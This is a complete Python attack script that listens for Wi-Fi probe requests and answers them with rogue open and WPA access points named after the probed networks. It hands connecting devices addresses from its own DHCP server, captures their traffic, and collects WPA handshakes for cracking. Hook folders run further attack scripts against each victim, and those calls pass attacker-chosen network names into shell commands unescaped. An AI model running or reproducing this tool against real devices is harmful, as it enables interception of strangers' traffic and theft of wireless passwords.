#!/usr/bin/python3
from scapy.all import *
import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from mac_vendor_lookup import MacLookup # pip3 install mac-vendor-lookup
from netaddr import IPNetwork, IPAddress
import os
import random
import subprocess
from time import sleep, time
from datetime import datetime
from threading import Thread
from colorama import Fore
import argparse

TIMEOUT = 20
TIMEOUT_CLIENT_RECONNECT = 5
CHANNEL_HOPPING_TIMEOUT = 2
CLIENT_MONITOR_TIMEOUT = 2
oui = MacLookup()
conf.verb = 0
DEFAULT_NETWORK = "11.0.0.1/24"
DEFAULT_IP = "11.0.0.1"

def on_probe(essid, sta, freq, signal, vendor):
	for script in os.listdir("on_probe"):
		script = os.path.join("on_probe", script)
		if os.path.isfile(script) and os.access(script, os.X_OK):
			DEBUG(f'{script} "{essid}" {sta} {freq} {signal} "{vendor}"')
			subprocess.Popen(f'{script} "{essid}" {sta} {freq} {signal} "{vendor}"', shell=True)

def on_network(essid, iface):
	for script in os.listdir("on_network"):
		script = os.path.join("on_network", script)
		if os.path.isfile(script) and os.access(script, os.X_OK):
			DEBUG(f'{script} "{essid}" {iface}')
			subprocess.Popen(f'{script} "{essid}" {iface}', shell=True)

def on_client(ip, mac, attacker_ip):
	for script in os.listdir("on_client"):
		script = os.path.join("on_client", script)
		if os.path.isfile(script) and os.access(script, os.X_OK):
			DEBUG(f"{script} {ip} {mac} {attacker_ip}")
			subprocess.Popen(f"{script} {ip} {mac} {attacker_ip}", shell=True)

def on_handshake(pcap, essid, bssid):
	for script in os.listdir("on_handshake"):
		script = os.path.join("on_handshake", script)
		if os.path.isfile(script) and os.access(script, os.X_OK):
			DEBUG(f'{script} "{pcap}" "{essid}" {bssid}')
			subprocess.Popen(f'{script} "{pcap}" "{essid}" {bssid}', shell=True)

class Hostapd:
	config = ''
	file = ''
	name = ''
	def __init__(self, iface, essid, password):
		self.iface = iface
		self.essid = essid
		self.password = password or 'impossible_to_guess'
		self.is_up = False
		self.is_shutdown = False
		self.clients = {}
		with open(self.file, "w") as f:
			f.write(self.config.format(iface=self.iface, essid=self.essid, password=self.password))
#		DEBUG("ifconfig {iface} up".format(iface=self.iface))
#		os.system("ifconfig {iface} up".format(iface=self.iface))
		self.hostapd = subprocess.Popen(["hostapd", self.file], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
		self.__status_thr = Thread(target=self.status)
		self.__client_monitor_thr = Thread(target=self.client_monitor)
		self.__status_thr.start()
		self.__client_monitor_thr.start()

	def wait(self, max_waiting_time):
		begin = time()
		while not self.is_up:
			sleep(0.1)
			if time() - begin > max_waiting_time:
				break
	
	def shutdown(self):
		self.is_shutdown = True
		self.hostapd.terminate()
		sleep(1)
		self.hostapd.kill()
		self.hostapd.wait()
#		os.system("ifconfig {iface} down".format(iface=self.iface))
#		DEBUG("ifconfig {iface} down".format(iface=self.iface))

	def status(self):
		while True:
			line = self.hostapd.stdout.readline()
			if not line:
				sleep(1)
				continue
#			DEBUG(line)
			line = line.decode("utf-8")
			if line.find("AP-ENABLED") != -1:
				self.is_up = True
			elif line.find("AP-DISABLED") != -1:
				self.is_up = False
			elif line.find("AP-STA-CONNECTED") != -1:
				client = line.split()[2]
				NOTICE("[{hostapd}] client {client} connected".format(hostapd=self.name, client=client))
			elif line.find("AP-STA-DISCONNECTED") != -1:
				client = line.split()[2]
				NOTICE("[{hostapd}] client {client} disconnected".format(hostapd=self.name, client=client))
			if self.is_shutdown:
				break

	def client_monitor(self):
		while True:
			if not self.is_up:
				sleep(1)
				continue
			self.clients = {}
			for line in subprocess.check_output("iw dev {iface} station dump".format(iface=self.iface).split()).split(b"\n"):
				#DEBUG(line)
				line = line.decode("utf-8")
				if line.find('Station') != -1:
					client = line.split()[1]
				elif line.find('signal:') != -1:
					signal = line.split()[1]
					self.clients[client] = signal
			if self.clients:
				for client in self.clients:
					NOTICE("client {client}: {rx} dBm".format(client=client, rx=self.clients[client]), end=", ")
				print("")
			sleep(CLIENT_MONITOR_TIMEOUT)
			if self.is_shutdown:
				break

class Hostapd_OPN(Hostapd):
	name = "OPN"
	file = "/tmp/ap_opn.conf"
	config = '''interface={iface}
driver=nl80211
ssid={essid}
hw_mode=g
channel=1
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0
'''

class Hostapd_WPA(Hostapd):
	name = "WPA"
	file = "/tmp/ap_wpa.conf"
	config = '''interface={iface}
driver=nl80211
ssid={essid}
hw_mode=g
channel=1
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0
wpa=3
wpa_key_mgmt=WPA-PSK
wpa_pairwise=CCMP
wpa_passphrase={password}
'''

class DHCPD:
	GW_IP = '11.0.0.1'
	BROADCAST = '11.0.0.255'
	NETMASK = '255.255.255.0'
	DNS_IP = '8.8.8.8'
	#DOMAIN = 'test.local'
	NBN_IP = '11.0.0.1'

	def __init__(self, iface):
		self.iface = iface
		self.is_shutdown = False
		self.dhcp_pool = ['11.0.0.11', '11.0.0.12', '11.0.0.13', '11.0.0.14', '11.0.0.15']
		self.ip = self.dhcp_pool.pop(0)
		Thread(target=self.start).start()

	def start(self):
		while not self.is_shutdown:
			sniff(iface=self.iface, prn=listen_dhcp, timeout=1, store=0)

	def stop(self):
		self.is_shutdown = True

	def send_offer(self, client_ip, client_mac, transaction=0):
		p = Ether(dst='ff:ff:ff:ff:ff:ff')/IP(dst='255.255.255.255', src=__class__.GW_IP)/\
			UDP(sport=67, dport=68)/\
			BOOTP(op=2, yiaddr=client_ip, siaddr='0.0.0.0', giaddr='0.0.0.0', chaddr=mac2str(client_mac), xid=transaction)/\
			DHCP(options=[("message-type", "offer"), ("server_id", __class__.GW_IP), ("broadcast_address", __class__.BROADCAST), ("router", __class__.GW_IP), ("subnet_mask", __class__.NETMASK), ('name_server', __class__.DNS_IP), ('NetBIOS_server', __class__.NBN_IP), 'end'])
		sendp(p, iface=self.iface)

	def send_ack(self, client_ip, client_mac, transaction=0):
		p = Ether(dst='ff:ff:ff:ff:ff:ff')/IP(dst='255.255.255.255', src=__class__.GW_IP)/\
			UDP(sport=67, dport=68)/\
			BOOTP(op=2, yiaddr=client_ip, siaddr='0.0.0.0', giaddr='0.0.0.0', chaddr=mac2str(client_mac), xid=transaction)/\
			DHCP(options=[("message-type", "ack"), ("server_id", __class__.GW_IP), ("broadcast_address", __class__.BROADCAST), ("router", __class__.GW_IP), ("subnet_mask", __class__.NETMASK), ('name_server', __class__.DNS_IP), ('NetBIOS_server', __class__.NBN_IP), 'end'])
		sendp(p, iface=self.iface)


def get_time():
	return datetime.now().strftime("%H:%M:%S")

def get_mac():
	return Ether().src

def get_password(essid):
	try:
		return open(os.path.join("handshakes","%s.txt"%essid)).read()
	except:
		return False

def DEBUG(msg, end='\n'):
	print(Fore.LIGHTBLACK_EX + "[.] [{time}] {msg}".format(time=get_time(), msg=msg) + Fore.RESET, end=end)

def INFO(msg, end='\n'):
	print(Fore.LIGHTBLUE_EX + "[*] [{time}] {msg}".format(time=get_time(), msg=msg) + Fore.RESET, end=end)

def INFO2(msg, end='\n'):
	print(Fore.BLUE + "[+] [{time}] {msg}".format(time=get_time(), msg=msg) + Fore.RESET, end=end)

def NOTICE(msg, end='\n'):
	print(Fore.LIGHTCYAN_EX + "[+] [{time}] {msg}".format(time=get_time(), msg=msg) + Fore.RESET, end=end)

def WARN(msg, end='\n'):
	print(Fore.LIGHTGREEN_EX + "[+] [{time}] {msg}".format(time=get_time(), msg=msg) + Fore.RESET, end=end)

def ERROR(msg, end='\n'):
	print(Fore.RED + "[!] [{time}] {msg}".format(time=get_time(), msg=msg) + Fore.RESET, end=end)

def lookup(mac):
	try:
		return oui.lookup(mac)
	except:
		return 'unknown'


def try_to_start_hostapd(Hostapd, iface, essid, password, max_attempts=5):
	attempt = 0
	while attempt <= max_attempts:
		attempt += 1
		DEBUG("Try to start \"{essid}\" attempt {n}".format(essid=essid, n=attempt))
		hostapd = Hostapd(iface, essid, password)
		hostapd.wait(5)
		if hostapd.is_up:
			break
		else:
			DEBUG("Error starting {hostapd}. Starting again".format(hostapd=Hostapd.__name__))
			hostapd.shutdown()
			sleep(1)
			continue
	return hostapd

hostapd_opn = None
hostapd_opn_is_start = False
hostapd_wpa = None
hostapd_wpa_is_start = False
victim_trafic = PacketList()
def start_AP_OPN(iface, essid):
	global hostapd_opn, hostapd_opn_is_start, victim_trafic, handshakes, dhcpd, stop_hopping, known_targets

	stop_hopping = True
	
	if hostapd_opn_is_start:
		return
	hostapd_opn_is_start = True

	hostapd_opn = try_to_start_hostapd(Hostapd_OPN, iface, essid, password=False, max_attempts=5)
	if hostapd_opn.is_up:
		dhcpd = DHCPD(iface)
		INFO("run {num} OPN network \"{essid}\"".format(num=pcap_no, essid=essid))
		on_network(essid, iface)
		begin = time()
		while time() - begin < TIMEOUT: # waiting first client
			victim_trafic = sniff(iface=iface, prn=parse_client_trafic, timeout=1)
			if handshakes: # if it was WPA network
				break
		while hostapd_opn.clients and not handshakes:
			try:
				victim_trafic += sniff(iface=iface, prn=parse_client_trafic, timeout=TIMEOUT_CLIENT_RECONNECT) # waiting during client won't disconnected
			except KeyboardInterrupt:
				break
		dhcpd.stop()
		hostapd_opn.shutdown()
		#if victim_trafic:
		#	save(victim_trafic, network_name=essid)
		INFO("stop OPN network \"{essid}\"".format(essid=essid))
	else:
		hostapd_opn.shutdown()
		ERROR("network OPN \"{essid}\" wasn't started".format(essid=essid))

	dhcpd = None
	#stop_hopping = False
	hostapd_opn = None
	victim_trafic = PacketList()
	known_targets.clear()
	hostapd_opn_is_start = False

handshakes = []
def start_AP_WPA(iface, essid):
	global hostapd_wpa, hostapd_wpa_is_start, handshakes, victim_trafic, known_targets, dhcpd

	if hostapd_wpa_is_start:
		return
	hostapd_wpa_is_start = True
	dhcpd = False

	password = get_password(essid)
	hostapd_wpa = try_to_start_hostapd(Hostapd_WPA, iface, essid, password, max_attempts=5)
	if hostapd_wpa.is_up:
		if password:
			dhcpd = DHCPD(iface)
		INFO("run {num} WPA network \"{essid}\" \"{password}\"".format(num=pcap_no, essid=essid, password=password if password else ""))
		on_network(essid, iface)
		m1 = False
		m2 = False
		begin = time()
		while time() - begin < TIMEOUT: 					# waiting client
			if not password:
				for p in sniff(iface=args.mon, filter="ether proto 0x888e", timeout=4):
					if EAPOL in p and p[Dot11].addr3 == wpa_mac:
						handshakes.append(p)
						if p[Dot11].addr2 == wpa_mac:
							m1 = True
						elif p[Dot11].addr1 == wpa_mac:
							m2 = True
				if m1 and m2:
					WARN("handshake: %d EAPOL packets (M1/M2)" % len(handshakes))
					break
			else:
				sniff(iface=iface, prn=parse_client_trafic, timeout=1)
				if hostapd_opn and hostapd_opn.clients:
					break
		if dhcpd:
			dhcpd.stop()
		hostapd_wpa.shutdown()
		if handshakes and not password:
			handshakes.append(get_beacon(essid))
			pcap = save(handshakes, network_name=os.path.join("handshakes", essid))
			if pcap:
				on_handshake(pcap, essid, get_mac())
				known_essids.remove(essid)
		INFO("stop WPA network \"{essid}\"".format(essid=essid))
	else:
		hostapd_wpa.shutdown()
		ERROR("network WPA \"{essid}\" wasn't started".format(essid=essid))

	dhcpd = None
	hostapd_wpa = None
	handshakes = []
	known_targets.clear()
	hostapd_wpa_is_start = False

def save(trafic, network_name):
	target_file = '%s.pcap' % network_name
	if not os.path.isfile(target_file):
		wrpcap(target_file, trafic)
		return '%s.pcap'%network_name

known_essids = set()
pcap_no = 0
def parse_raw_80211(p):
	global known_essids, hostapd_opn, hostapd_wpa, pcap_no
	if Dot11ProbeReq in p:
		if p[Dot11Elt].info:
			sta = p[Dot11].addr2
			try:
				essid = str(p[Dot11Elt].info, "utf-8")
			except:
				#essid = str(p[Dot11Elt].info, "cp1251")
				essid = ""
			vendor = lookup(sta)
			signal = "%s" % p[RadioTap].dBm_AntSignal if hasattr(p[RadioTap], "dBm_AntSignal") else "-"
			freq = "%d" % p[RadioTap].ChannelFrequency if hasattr(p[RadioTap], "ChannelFrequency") else "-"
			INFO2("{sta} ({vendor}) {signal} dBM ({freq} MHz): {essid}".format(sta=sta, vendor=vendor, signal=signal, freq=freq, essid=essid))
			on_probe(essid, sta, freq, signal, vendor)
			if not essid in known_essids and not hostapd_opn and not hostapd_wpa:
				pcap_no += 1
				#os.system("killall -KILL hostapd 2> /dev/null")
				if args.opn:
					Thread(target=start_AP_OPN, args=(args.opn,essid)).start()
					known_essids.add(essid)
				#sleep(1)
				if args.wpa:
					Thread(target=start_AP_WPA, args=(args.wpa,essid)).start()
					known_essids.add(essid)
	'''else:
		essid = "test"
		if not essid in known_essids and not hostapd_opn and not hostapd_wpa:
			pcap_no += 1
			if args.opn:
				Thread(target=start_AP_OPN, args=(args.opn,essid)).start()
			if args.wpa:
				Thread(target=start_AP_WPA, args=(args.wpa,essid)).start()
			known_essids.add(essid)'''
				
known_targets = set()
gw_ip = DEFAULT_IP
def parse_client_trafic(p):
	global known_targets, gw_ip
	if IP in p:
		if p[IP].src in ("0.0.0.0", "127.0.0.1", gw_ip):
			return
		if p[IP].src in known_targets or p[IP].dst in known_targets:
			return
		client_mac = p[Ether].src
		client_ip = p[IP].src
		gw_ip = str( IPNetwork("{ip}/24".format(ip=client_ip))[1] )
		WARN("client {mac} {ip}".format(mac=client_mac, ip=client_ip))
		known_targets.add(client_ip)
		change_network_settings("{ip}/24".format(ip=gw_ip))
		on_client(client_ip, client_mac, gw_ip)

dhcpd = None
def listen_dhcp(p):
	global DHCPD, dhcpd
	if dhcpd and BOOTP in p:
		if p[BOOTP].op == 1: # DISCOVER/REQUEST
			client_mac = p[Ether].src
			vendor_class_id = ''
			hostname = ''
			requested_addr = ''
			transaction = p[BOOTP].xid
			for option in p[DHCP].options:
				if 'vendor_class_id' in option:
					vendor_class_id = option[1]
				elif 'hostname' in option:
					hostname = option[1]
				elif 'requested_addr' in option:
					requested_addr = option[1]
			if not requested_addr:
				NOTICE("DHCP discover {vendor} {hostname}".format(vendor=vendor_class_id, hostname=hostname))
				dhcpd.send_offer(dhcpd.ip, client_mac, transaction)
				NOTICE("DHCP offer {ip} {gw} {mask} {dns}".format(ip=dhcpd.ip, gw=DHCPD.GW_IP, mask=DHCPD.NETMASK, dns=DHCPD.DNS_IP))
			else:
				NOTICE("DHCP request {vendor} {hostname} {ip}".format(vendor=vendor_class_id, hostname=hostname, ip=requested_addr))
				dhcpd.send_ack(requested_addr, client_mac, transaction)
				NOTICE("DHCP ack {ip} {gw} {mask} {dns}".format(ip=requested_addr, gw=DHCPD.GW_IP, mask=DHCPD.NETMASK, dns=DHCPD.DNS_IP))
				dhcpd.ip = dhcpd.dhcp_pool.pop(0) if len(dhcpd.dhcp_pool) > 1 else dhcpd.dhcp_pool[0]

def get_beacon(essid):
	radio = RadioTap(len=18, present=0x482e,Rate=2,Channel=2412,ChannelFlags=0x00a0,dBm_AntSignal=chr(1),Antenna=1)
	dot11 = Dot11(type=0, subtype=8, addr1='ff:ff:ff:ff:ff:ff',addr2=wpa_mac, addr3=wpa_mac)
	beacon = Dot11Beacon(cap='ESS+privacy')
	essid = Dot11Elt(ID='SSID',info=essid, len=len(essid))
	return radio/dot11/beacon/essid

def change_network_settings(network):
	if args.opn:
		DEBUG("ifconfig {iface} {network}".format(iface=args.opn, network=network))
		os.system("ifconfig {iface} {network}".format(iface=args.opn, network=network))
	elif args.wpa:
		DEBUG("ifconfig {iface} {network}".format(iface=args.wpa, network=network))
		os.system("ifconfig {iface} {network}".format(iface=args.wpa, network=network))

def sniffer(iface):
	sniff(iface=iface, prn=parse_raw_80211, store=0)

stop_hopping = False
def channel_hopping():
	global stop_hopping
	#channels = [1,2,3,4,5,6,7,8,9,10,11]
	channels = [1,6,11]
	while True:
		if not stop_hopping:
			channel = random.choice(channels)
			#DEBUG("hop channel %d" % channel)
			os.system("iwconfig {iface} channel {ch}".format(iface=args.mon, ch=channel))
			sleep(CHANNEL_HOPPING_TIMEOUT)

parser = argparse.ArgumentParser(description='wifi clients announce attacking')
parser.add_argument("-mon", type=str, default='', help="interface for monitor 802.11")
parser.add_argument("-opn", type=str, default='', help="interface for starting OPN networks")
parser.add_argument("-wpa", type=str, default='', help="interface for starting WPA networks")
args = parser.parse_args()

origin = conf.iface
conf.iface = args.opn
opn_mac = Ether().src
conf.iface = args.wpa
wpa_mac = Ether().src
conf.iface = origin

change_network_settings(DEFAULT_NETWORK)
sniffer_thr = Thread(target=sniffer, args=(args.mon,))
sniffer_thr.start()
sniffer_thr.join()

